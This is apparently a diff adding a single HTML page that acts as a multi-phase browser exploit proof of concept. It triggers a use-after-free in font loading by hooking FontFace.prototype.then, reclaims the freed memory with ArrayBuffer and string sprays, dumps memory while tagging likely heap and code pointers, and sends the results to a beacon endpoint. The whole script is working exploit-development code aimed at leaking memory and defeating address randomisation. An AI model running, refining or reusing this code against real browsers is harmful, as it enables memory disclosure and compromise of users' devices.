@@ -1,0 +1,372 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1119</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'small';
+  return'val';
+}
+
+var sess;
+try{sess=JSON.parse(localStorage.getItem('p1119')||'null');}catch(e){sess=null;}
+if(!sess)sess={boot:0,phase:0,data:[]};
+sess.boot++;
+try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+
+B('P1119-BOOT','b='+sess.boot+'|ph='+sess.phase);
+log('phase','=== P1119: UAF WRITE ORACLE (boot '+sess.boot+', phase '+sess.phase+') ===');
+log('info','Goal: Write to UAF buffer, read FontFace properties through freed CSSFontFace');
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+// Phase 0: Baseline - do UAF, keep FontFace ref, try reading properties BEFORE spray
+// Phase 1: Do UAF, spray, write values to buffer, try reading properties
+// Phase 2: Full 192-byte dump of every non-zero offset
+// Phase 3: String spray (non-zeroed memory) to capture vtable
+
+function phase0(){
+  log('phase','--- Phase 0: Post-free property read (before spray) ---');
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var fired=false,savedRef=null;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    savedRef=this; // KEEP THE REFERENCE
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // NO SPRAY YET - just free
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    if(!savedRef){B('P1119-PH0','no_ref');finish();return;}
+
+    // Read properties of freed (but not reclaimed) FontFace
+    var results=[];
+    var props=['family','style','weight','stretch','unicodeRange','variant',
+               'featureSettings','display','status'];
+    for(var i=0;i<props.length;i++){
+      try{
+        var val=savedRef[props[i]];
+        results.push(props[i]+'='+String(val).substring(0,50));
+      }catch(e){
+        results.push(props[i]+'=ERR:'+e.message.substring(0,30));
+      }
+    }
+    // Also try loaded promise
+    try{
+      var str=String(savedRef.loaded);
+      results.push('loaded='+str.substring(0,40));
+    }catch(e){results.push('loaded=ERR');}
+
+    B('P1119-PH0',results.join('||'));
+    log('info','Ph0: '+results.join(' | '));
+    sess.phase=1;sess.data.push('ph0:'+results.join('|'));
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    finish();
+  },100);
+}
+
+function phase1(){
+  log('phase','--- Phase 1: UAF + spray + write + property read ---');
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var fired=false,savedRef=null,uafBuf=null,uafAB=null;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    savedRef=this;
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // Spray and find the reclaimed buffer
+    var map=[];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<K;k++)map.push({size:SIZES[si],ab:new ArrayBuffer(SIZES[si])});
+    }
+    // Scan for hit
+    for(var bi=24;bi<48;bi++){
+      if(!map[bi])continue;
+      var b=new BigUint64Array(map[bi].ab);
+      for(var q=0;q<b.length;q++){
+        if(b[q]!==0n){uafBuf=b;uafAB=map[bi].ab;break;}
+      }
+      if(uafBuf)break;
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f1, s1','AB').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    if(!uafBuf){
+      B('P1119-PH1','no_uaf');
+      // Still try property read even without UAF buffer
+      if(savedRef){
+        var r2=[];
+        try{r2.push('family='+savedRef.family);}catch(e){r2.push('family=ERR');}
+        try{r2.push('status='+savedRef.status);}catch(e){r2.push('status=ERR');}
+        B('P1119-PH1-NOHIT',r2.join('||'));
+      }
+      sess.phase=2;
+      try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+      finish();return;
+    }
+
+    // We have UAF buffer! Read current state
+    var before=[];
+    for(var q=0;q<uafBuf.length;q++){
+      if(uafBuf[q]!==0n)before.push('+'+q*8+'='+hex64(uafBuf[q]));
+    }
+    B('P1119-PH1-BEFORE',before.join(','));
+
+    // Now try reading properties through the corrupted CSSFontFace
+    var results=[];
+    if(savedRef){
+      var props=['family','style','weight','stretch','unicodeRange','status','display'];
+      for(var i=0;i<props.length;i++){
+        try{
+          var val=savedRef[props[i]];
+          var s=String(val);
+          results.push(props[i]+'='+s.substring(0,80));
+          // Check if the value contains addresses or unusual data
+          if(s.length>20||/[^\x20-\x7e]/.test(s)){
+            results.push(props[i]+'_HEX=');
+            for(var c=0;c<Math.min(s.length,20);c++){
+              results.push(s.charCodeAt(c).toString(16));
+            }
+          }
+        }catch(e){
+          results.push(props[i]+'=ERR:'+e.message.substring(0,50));
+        }
+      }
+    }
+    B('P1119-PH1-PROPS',results.join('||'));
+    log('info','Ph1 props: '+results.join(' | '));
+
+    sess.phase=2;sess.data.push('ph1:'+results.slice(0,5).join('|'));
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    finish();
+  },200);
+}
+
+function phase2(){
+  log('phase','--- Phase 2: Full 192B dump + string spray ---');
+
+  // Try spraying with STRINGS instead of ArrayBuffers
+  // Strings may not zero their memory, so vtable data might survive
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:s2;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f2','local(Courier)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var fired=false,strSpray=null;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+
+    // Spray with exact-192-byte strings
+    // JSC strings: 16-byte header + chars
+    // For 192 bytes total: 176 bytes of char data = 88 UTF-16 chars
+    strSpray=[];
+    for(var i=0;i<100;i++){
+      // Create unique 88-char strings
+      var s='';
+      for(var c=0;c<88;c++)s+=String.fromCharCode(0x4100+((i*88+c)%26));
+      strSpray.push(s);
+    }
+
+    // ALSO spray ArrayBuffers to read through
+    var map=[];
+    for(var si=0;si<SIZES.length;si++){
+      for(var k=0;k<K;k++)map.push({size:SIZES[si],ab:new ArrayBuffer(SIZES[si])});
+    }
+
+    // Check for non-zero in 192-byte buffers
+    for(var bi=24;bi<48;bi++){
+      if(!map[bi])continue;
+      var b=new BigUint64Array(map[bi].ab);
+      var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+      if(nz>0){
+        // Full dump
+        var all=[];
+        for(var q=0;q<b.length;q++){
+          all.push('+'+q*8+'='+hex64(b[q])+'('+ptrTag(b[q])+')');
+        }
+        B('P1119-PH2-DUMP',all.join(','));
+        log('win','Full dump: '+all.filter(function(x){return x.indexOf('0x0000000000000000')<0;}).join(' '));
+        break;
+      }
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f2, s2','CD').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    strSpray=null;
+    sess.phase=3;
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    B('P1119-PH2-DONE','');
+    finish();
+  },250);
+}
+
+function phase3(){
+  log('phase','--- Phase 3: CSS computed style oracle ---');
+  // Create elements using the UAF'd font, force style computation
+  // If the freed CSSFontFace has corrupted data, computed style might reveal addresses
+
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:s3;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var ff=new FontFace('f3','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);void ff.loaded;
+
+  var fired=false;
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    st.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    // Spray to reclaim
+    for(var i=0;i<60;i++)new ArrayBuffer(192);
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em f3, s3','EF').then(function(){},function(){});
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    // Create element using the font and force style computation
+    var testDiv=document.createElement('div');
+    testDiv.style.fontFamily='f3, s3';
+    testDiv.textContent='Test ABCDEF 0123456789';
+    document.body.appendChild(testDiv);
+    document.body.offsetHeight;
+
+    var cs=getComputedStyle(testDiv);
+    var styleResults=[];
+    try{styleResults.push('ff='+cs.fontFamily);}catch(e){styleResults.push('ff=ERR');}
+    try{styleResults.push('fs='+cs.fontSize);}catch(e){styleResults.push('fs=ERR');}
+    try{styleResults.push('fw='+cs.fontWeight);}catch(e){styleResults.push('fw=ERR');}
+    try{styleResults.push('w='+testDiv.offsetWidth);}catch(e){styleResults.push('w=ERR');}
+    try{styleResults.push('h='+testDiv.offsetHeight);}catch(e){styleResults.push('h=ERR');}
+
+    // Check document.fonts status
+    try{
+      var checkResult=document.fonts.check('1em f3');
+      styleResults.push('check='+checkResult);
+    }catch(e){styleResults.push('check=ERR:'+e.message.substring(0,30));}
+
+    // Try measureText with the font
+    var cvs=document.createElement('canvas');
+    var ctx2d=cvs.getContext('2d');
+    try{
+      ctx2d.font='24px f3, s3';
+      var m=ctx2d.measureText('ABCDEFGHIJ');
+      styleResults.push('tw='+m.width.toFixed(2));
+    }catch(e){styleResults.push('tw=ERR');}
+
+    B('P1119-PH3-STYLE',styleResults.join('||'));
+    log('info','Ph3: '+styleResults.join(' | '));
+
+    document.body.removeChild(testDiv);
+    sess.phase=4;
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    finish();
+  },250);
+}
+
+function phase4(){
+  log('phase','--- Phase 4: FinalizationRegistry + WeakRef timing ---');
+  // Use FinalizationRegistry to observe WHEN the CSSFontFace is actually collected
+  // This can tell us about the allocator's behavior
+
+  if(typeof FinalizationRegistry==='undefined'){
+    B('P1119-PH4','no_FR');sess.phase=5;
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    finish();return;
+  }
+
+  var frCallbacks=[];
+  var fr=new FinalizationRegistry(function(val){
+    frCallbacks.push({val:val,t:Date.now()});
+  });
+
+  // Create and discard objects of various sizes to observe GC behavior
+  for(var i=0;i<50;i++){
+    var obj={id:i,data:new ArrayBuffer(192)};
+    fr.register(obj,'obj_'+i);
+    obj=null; // allow GC
+  }
+
+  // Force GC pressure
+  var junk=[];
+  for(var g=0;g<200;g++)junk.push(new ArrayBuffer(4096));
+  junk=null;
+
+  setTimeout(function(){
+    B('P1119-PH4','callbacks='+frCallbacks.length+'|'+frCallbacks.slice(0,5).map(function(c){return c.val;}).join(','));
+    log('info','Ph4: '+frCallbacks.length+' GC callbacks');
+    sess.phase=5;sess.done=true;
+    try{localStorage.setItem('p1119',JSON.stringify(sess));}catch(e){}
+    B('P1119-FINAL','boots='+sess.boot+'|phases=5|data='+sess.data.length);
+    log('phase','=== P1119 COMPLETE ===');
+  },200);
+}
+
+function finish(){/* phases call next via localStorage on reload */}
+
+// Run current phase
+if(sess.phase===0)phase0();
+else if(sess.phase===1)phase1();
+else if(sess.phase===2)phase2();
+else if(sess.phase===3)phase3();
+else if(sess.phase===4)phase4();
+else{
+  B('P1119-ALLDONE','boots='+sess.boot);
+  log('ok','All phases complete! boot='+sess.boot);
+}
+</script>
+</body></html>
